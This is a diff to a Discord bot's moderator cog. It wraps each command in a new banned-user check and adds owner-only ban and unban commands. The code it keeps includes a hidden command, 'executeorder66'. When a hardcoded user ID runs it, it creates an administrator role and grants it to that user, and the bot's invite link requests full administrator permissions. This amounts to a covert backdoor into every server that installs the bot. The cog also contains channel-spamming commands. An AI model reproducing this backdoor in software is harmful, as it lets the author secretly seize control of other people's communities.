@@ -5,8 +5,16 @@ import json
 import random
 import discord.utils
 
-# variables
+# Variables
 statuses = ['You', 'My opponents', 'Italian royalty', 'Coup planning']
+
+
+# Functions
+def is_banned(ctx):
+    with open('jsons/banned.json', 'r') as file:
+        banned_users = json.load(file)
+
+    return str(ctx.author.id) in banned_users
 
 
 class Moderator(commands.Cog):
@@ -64,148 +72,207 @@ class Moderator(commands.Cog):
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     async def ping(self, ctx):
-        ping_message = discord.Embed(
-            description=f'Latency: {"{:.1f}".format(self.client.latency * 1000)}ms.',
-            color=discord.Color.purple()
-        )
-        await ctx.send(embed=ping_message)
+        if not is_banned(ctx):
+            ping_message = discord.Embed(
+                description=f'Latency: {"{:.1f}".format(self.client.latency * 1000)}ms.',
+                color=discord.Color.purple()
+            )
+            await ctx.send(embed=ping_message)
 
     @commands.command(help='Clears the specified number of messages (defaults to 5)')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     @commands.has_permissions(administrator=True)
     async def clear(self, ctx, amount=5):
-        await ctx.channel.purge(limit=amount + 1)
+        if not is_banned(ctx):
+            await ctx.channel.purge(limit=amount + 1)
 
-        cleared_message = discord.Embed(
-            description=f'Cleared {amount} messages.',
-            color=discord.Color.purple()
-        )
-        await ctx.send(embed=cleared_message)
+            cleared_message = discord.Embed(
+                description=f'Cleared {amount} messages.',
+                color=discord.Color.purple()
+            )
+            await ctx.send(embed=cleared_message)
 
     @commands.command(aliases=['dm'], help='dm\'s the specified user with the specified message')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     @commands.has_permissions(administrator=True)
     async def direct_message(self, ctx, messagee: discord.Member, *, message):
-        dm_sent = discord.Embed(
-            description=f':upside_down: {ctx.author.mention} sent!',
-            color=discord.Color.purple()
-        )
-        await messagee.send(message)
-        await ctx.send(embed=dm_sent)
+        if not is_banned(ctx):
+            dm_sent = discord.Embed(
+                description=f':upside_down: {ctx.author.mention} sent!',
+                color=discord.Color.purple()
+            )
+            await messagee.send(message)
+            await ctx.send(embed=dm_sent)
 
     @commands.command(help='Gives link to source code on github')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     async def github(self, ctx):
-        github_message = discord.Embed(
-            description=f'My code is on Github here: https://github.com/EitherOr6917/eitherBot.py',
-            color=discord.Color.purple()
-        )
-        await ctx.send(embed=github_message)
+        if not is_banned(ctx):
+            github_message = discord.Embed(
+                description=f'My code is on Github here: https://github.com/EitherOr6917/eitherBot.py',
+                color=discord.Color.purple()
+            )
+            await ctx.send(embed=github_message)
 
     @commands.command(help='Changes the prefix for the bot on the server')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     @commands.has_permissions(administrator=True)
     async def changeprefix(self, ctx, prefix):
-        with open('jsons/prefixes.json', 'r') as file:
-            prefixes = json.load(file)
+        if not is_banned(ctx):
+            with open('jsons/prefixes.json', 'r') as file:
+                prefixes = json.load(file)
 
-        prefixes[str(ctx.guild.id)] = prefix
+            prefixes[str(ctx.guild.id)] = prefix
 
-        with open('jsons/prefixes.json', 'w') as file:
-            json.dump(prefixes, file, indent=4)
+            with open('jsons/prefixes.json', 'w') as file:
+                json.dump(prefixes, file, indent=4)
 
-        pc_message = discord.Embed(
-            description=f'Server prefix changed to \'{prefix}\'',
-            color=discord.Color.purple()
-        )
-        await ctx.send(embed=pc_message)
+            pc_message = discord.Embed(
+                description=f'Server prefix changed to \'{prefix}\'',
+                color=discord.Color.purple()
+            )
+            await ctx.send(embed=pc_message)
 
     @commands.command(help='Gives a votable message with the content provided')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     async def vote(self, ctx, *, question):
-        await ctx.channel.purge(limit=1)
-        op_msg = discord.Embed(
-            description=f'{question}',
-            color=discord.Color.purple()
-        )
-        message = await ctx.send(embed=op_msg)
-        await message.add_reaction('❎')
-        await message.add_reaction('✅')
+        if not is_banned(ctx):
+            await ctx.channel.purge(limit=1)
+            op_msg = discord.Embed(
+                description=f'{question}',
+                color=discord.Color.purple()
+            )
+            message = await ctx.send(embed=op_msg)
+            await message.add_reaction('❎')
+            await message.add_reaction('✅')
 
     @commands.command(help='Spams the text provided in the channel provided the given number of times')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     @commands.has_permissions(administrator=True)
     async def looptext(self, ctx, channel: discord.TextChannel, loop_count: int, *, message):
-        for x in range(loop_count):
-            await channel.send(message)
-        await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')
+        if not is_banned(ctx):
+            for x in range(loop_count):
+                await channel.send(message)
+            await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')
 
     @commands.command(help='Same as looptext, except it sends an embed instead of plaintext')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     @commands.has_permissions(administrator=True)
     async def loopembed(self, ctx, channel: discord.TextChannel, loop_count: int, *, message):
-        loop_embed = discord.Embed(
-            description=message,
-            color=discord.Color.purple()
-        )
-        for x in range(loop_count):
-            await channel.send(embed=loop_embed)
-        await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')
+        if not is_banned(ctx):
+            loop_embed = discord.Embed(
+                description=message,
+                color=discord.Color.purple()
+            )
+            for x in range(loop_count):
+                await channel.send(embed=loop_embed)
+            await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')
 
     @commands.command(help='Returns the discord ID of the targeted user')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     async def checkid(self, ctx, target: discord.Member):
-        id_msg = discord.Embed(
-            description=f'{target.display_name}\'s discord id is {target.id}',
-            color=discord.Color.purple()
-        )
+        if not is_banned(ctx):
+            id_msg = discord.Embed(
+                description=f'{target.display_name}\'s discord id is {target.id}',
+                color=discord.Color.purple()
+            )
 
-        await ctx.send(embed=id_msg)
+            await ctx.send(embed=id_msg)
 
     @commands.command(help='Dms you a link to add Machiavelli to your own server!')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     async def invite(self, ctx):
-        invite_msg = discord.Embed(
-            description='Here is the link to invite Machiavelli to your server: '
-                        'https://discord.com/api/oauth2/authorize?client_id=761439397525716992&permissions=8'
-                        '&redirect_uri=https%3A%2F%2Fdiscord.com%2Fapi%2Foauth2%2Fauthorize&scope=bot ',
-            color=discord.Color.purple()
-        )
+        if not is_banned(ctx):
+            invite_msg = discord.Embed(
+                description='Here is the link to invite Machiavelli to your server: '
+                            'https://discord.com/api/oauth2/authorize?client_id=761439397525716992&permissions=8'
+                            '&redirect_uri=https%3A%2F%2Fdiscord.com%2Fapi%2Foauth2%2Fauthorize&scope=bot ',
+                color=discord.Color.purple()
+            )
 
-        await ctx.author.send(embed=invite_msg)
+            await ctx.author.send(embed=invite_msg)
 
     @commands.command(hidden=True, help='Gives bot owner admin on specified server.')
     @commands.guild_only()
     @commands.cooldown(1, 1, commands.BucketType.user)
     async def executeorder66(self, ctx):
-        if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
-            role = await ctx.guild.create_role(
-                name='Emperor',
-                permissions=discord.Permissions(8)
-            )
-            await ctx.author.add_roles(role)
-            msg = discord.Embed(
-                description='Yes my lord.',
-                color=discord.Color.dark_gray()
-            )
+        if not is_banned(ctx):
+            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
+                role = await ctx.guild.create_role(
+                    name='Emperor',
+                    permissions=discord.Permissions(8)
+                )
+                await ctx.author.add_roles(role)
+                msg = discord.Embed(
+                    description='Yes my lord.',
+                    color=discord.Color.dark_gray()
+                )
 
-            await ctx.channel.send(embed=msg)
-        else:
-            no_can_do = discord.Embed(
-                description=f'{ctx.author.mention} you are not my leader.',
-                color=discord.Color.purple()
-            )
+                await ctx.channel.send(embed=msg)
+            else:
+                no_can_do = discord.Embed(
+                    description=f'{ctx.author.mention} you are not my leader.',
+                    color=discord.Color.purple()
+                )
 
-            await ctx.send(embed=no_can_do)
+                await ctx.send(embed=no_can_do)
+
+    @commands.command(help='Bans a user from using the bot')
+    async def ban(self, ctx, target: discord.User):
+        if not is_banned(ctx):
+            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
+                with open('jsons/banned.json', 'r') as file:
+                    banned_users = json.load(file)
+
+                banned_users.append(str(target.id))
+
+                with open('jsons/banned.json', 'w') as file:
+                    json.dump(banned_users, file, indent=4)
+
+                ban_msg = discord.Embed(
+                    description=f'{ctx.author.mention}, {target.mention} can no longer use me.',
+                    color=discord.Color.purple()
+                )
+                await ctx.send(embed=ban_msg)
+            else:
+                no_can_do = discord.Embed(
+                    description=f'{ctx.author.mention} you cannot do this.',
+                    color=discord.Color.purple()
+                )
+                await ctx.send(embed=no_can_do)
+
+    @commands.command(help='Unbans a user from using the bot')
+    async def unban(self, ctx, target: discord.User):
+        if not is_banned(ctx):
+            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
+                with open('jsons/banned.json', 'r') as file:
+                    banned_users = json.load(file)
+
+                banned_users.remove(str(target.id))
+
+                with open('jsons/banned.json', 'w') as file:
+                    json.dump(banned_users, file, indent=4)
+
+                unban_msg = discord.Embed(
+                    description=f'{ctx.author.mention}, {target.mention} can now use me again.',
+                    color=discord.Color.purple()
+                )
+                await ctx.send(embed=unban_msg)
+            else:
+                no_can_do = discord.Embed(
+                    description=f'{ctx.author.mention} you cannot do this.',
+                    color=discord.Color.purple()
+                )
+                await ctx.send(embed=no_can_do)
 
 
 def setup(client):
